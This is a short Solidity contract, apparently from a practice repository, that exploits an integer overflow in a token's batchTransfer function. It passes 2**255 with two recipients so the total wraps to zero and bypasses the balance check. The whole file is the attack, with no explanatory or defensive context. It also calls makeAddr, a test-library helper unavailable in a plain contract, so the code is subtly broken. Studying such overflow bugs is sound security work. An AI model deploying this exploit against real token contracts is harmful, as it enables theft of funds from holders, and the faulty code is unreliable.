// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {OverflowToken} from "../src/OverflowToken.sol";

contract OverflowAttack {
    OverflowToken public token;

    constructor(address _token) {
        token = OverflowToken(_token);
    }

    function exploit() external {
        uint256 value = 2**255;
        address[] memory recipients = new address[](2);
        recipients[0] = address(this);
        recipients[1] = makeAddr("victim"); // or address(this) for double, but then balance wraps to 0
        token.batchTransfer(recipients, value);
    }
}